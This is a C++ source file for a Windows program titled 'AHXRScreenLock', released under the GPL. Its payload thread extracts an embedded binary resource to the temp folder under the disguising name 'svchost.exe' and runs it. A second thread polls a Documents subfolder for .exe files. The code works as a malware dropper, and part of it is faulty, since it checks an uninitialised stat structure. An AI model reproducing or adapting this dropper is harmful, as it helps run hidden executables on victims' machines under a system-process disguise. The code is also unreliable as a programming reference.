/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#ifdef __cplusplus_cli
	#define generic __identifier(generic)
#endif
	#include						<boost/filesystem.hpp>
#ifdef __cplusplus_cli
	#undef generic
#endif

#include							"payload.h"
#include							"resource.h"
#include							<string>
#include							<fstream>
#include							<Windows.h>
#include							<iostream>
#include							<shlobj.h>
#include							<vector>

HANDLE								h_payload;
HANDLE								h_shutdown;
DWORD								dw_shutdown;
DWORD								dw_payload;
namespace							fs = boost::filesystem;
bool								b_new_generated;
bool								b_first;
int									i_dir_count;
int									i_old_dir_count;
std::string							s_documents_path;

DWORD WINAPI t_shutdown(LPVOID lpParameter) {
	
	char
		my_documents[MAX_PATH]
	;
	HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, my_documents);
	s_documents_path = my_documents + std::string("\\") + SHUTDOWN_FOLDER_NAME + std::string("\\");
	
	while (1) {

		struct stat info;
		if (info.st_mode & S_IFDIR) {
			fs::directory_iterator it_end;
			fs::directory_iterator it_dir(s_documents_path);
			i_dir_count = 0;

			while (it_dir != it_end) {
				try {
					if (!fs::is_directory(it_dir->status())) // Listing non-directory files.
						if (it_dir->path().filename().extension() == ".exe") {
							i_dir_count++;
							if (!b_first)
								i_old_dir_count++;
						}

					it_dir++;
				}
				catch (const std::exception & ex) {
					std::cout << it_dir->path().filename() << " " << ex.what() << std::endl;
				}
			}
			b_new_generated = (i_dir_count != i_old_dir_count);
			i_old_dir_count = i_dir_count;
			b_first = true;
			Sleep(5000);
		}
	}
	return 0;
}

DWORD WINAPI t_payload(LPVOID lpParameter) {

	h_shutdown = CreateThread(0, 0, t_shutdown, 0, 0, &dw_payload);


	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int i_resource = ::SizeofResource(NULL, hRes);
	LPVOID lpRes = LoadResource(NULL, hRes);
	void * pResourceLock = LockResource(lpRes);

	TCHAR tmpPath[MAX_PATH];
	GetTempPath(MAX_PATH, tmpPath);

	std::string s_extract;
	s_extract = tmpPath;
	s_extract += "svchost.exe";

	std::fstream f;

	f.open(s_extract, std::ios::out | std::ios::binary);
	f.write((char*)pResourceLock, i_resource);
	f.close();

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	CreateProcess(s_extract.c_str(), "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
/*
	if (CreateProcess(s_extract.c_str(), "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}*/
	return 0;
}